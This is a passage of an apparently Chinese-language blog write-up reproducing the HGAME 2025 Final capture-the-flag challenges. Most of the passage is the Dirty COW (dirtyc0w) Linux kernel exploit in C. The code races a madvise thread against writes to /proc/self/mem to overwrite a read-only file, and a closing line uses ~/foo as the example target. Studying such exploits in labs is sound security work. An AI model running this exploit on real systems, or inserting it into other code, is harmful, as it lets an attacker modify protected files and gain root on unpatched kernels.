+<span class="comment">&gt;  Enterprise Linux 5 and 6 out of the box because on one side of</span>
+<span class="comment">&gt;  the race it writes to /proc/self/mem, but /proc/self/mem is not</span>
+<span class="comment">&gt;  writable on Red Hat Enterprise Linux 5 and 6.</span>
+<span class="comment">*/</span>
+  <span class="type">int</span> f=open(<span class="string">"/proc/self/mem"</span>,O_RDWR);
+  <span class="type">int</span> i,c=<span class="number">0</span>;
+  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) {
+<span class="comment">/*</span>
+<span class="comment">You have to reset the file pointer to the memory position.</span>
+<span class="comment">*/</span>
+    lseek(f,(<span class="type">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);
+    c+=write(f,str,<span class="built_in">strlen</span>(str));
+  }
+  <span class="built_in">printf</span>(<span class="string">"procselfmem %d\n\n"</span>, c);
+}
+ 
+ 
+<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> *argv[])</span>
+{
+<span class="comment">/*</span>
+<span class="comment">You have to pass two arguments. File and Contents.</span>
+<span class="comment">*/</span>
+  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) {
+  (<span class="type">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"%s\n"</span>,
+      <span class="string">"usage: dirtyc0w target_file new_content"</span>);
+  <span class="keyword">return</span> <span class="number">1</span>; }
+  <span class="type">pthread_t</span> pth1,pth2;
+<span class="comment">/*</span>
+<span class="comment">You have to open the file in read only mode.</span>
+<span class="comment">*/</span>
+  f=open(argv[<span class="number">1</span>],O_RDONLY);
+  fstat(f,&amp;st);
+  name=argv[<span class="number">1</span>];
+<span class="comment">/*</span>
+<span class="comment">You have to use MAP_PRIVATE for copy-on-write mapping.</span>
+<span class="comment">&gt; Create a private copy-on-write mapping.  Updates to the</span>
+<span class="comment">&gt; mapping are not visible to other processes mapping the same</span>
+<span class="comment">&gt; file, and are not carried through to the underlying file.  It</span>
+<span class="comment">&gt; is unspecified whether changes made to the file after the</span>
+<span class="comment">&gt; mmap() call are visible in the mapped region.</span>
+<span class="comment">*/</span>
+<span class="comment">/*</span>
+<span class="comment">You have to open with PROT_READ.</span>
+<span class="comment">*/</span>
+  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);
+  <span class="built_in">printf</span>(<span class="string">"mmap %zx\n\n"</span>,(<span class="type">uintptr_t</span>) <span class="built_in">map</span>);
+<span class="comment">/*</span>
+<span class="comment">You have to do it on two threads.</span>
+<span class="comment">*/</span>
+  pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);
+  pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);
+<span class="comment">/*</span>
+<span class="comment">You have to wait for the threads to finish.</span>
+<span class="comment">*/</span>
+  pthread_join(pth1,<span class="literal">NULL</span>);
+  pthread_join(pth2,<span class="literal">NULL</span>);
+  <span class="keyword">return</span> <span class="number">0</span>;
+}</code></pre>
 <p>以 <code>~/foo</code> 为例，这是一个只读文件：</p>
 <p><img src="\2025320-HGAME-2025-Final-复现/image-20250402225857712.png"></p>
 <p><img src="\2025320-HGAME-2025-Final-复现/image-20250402225927656.png"></p>
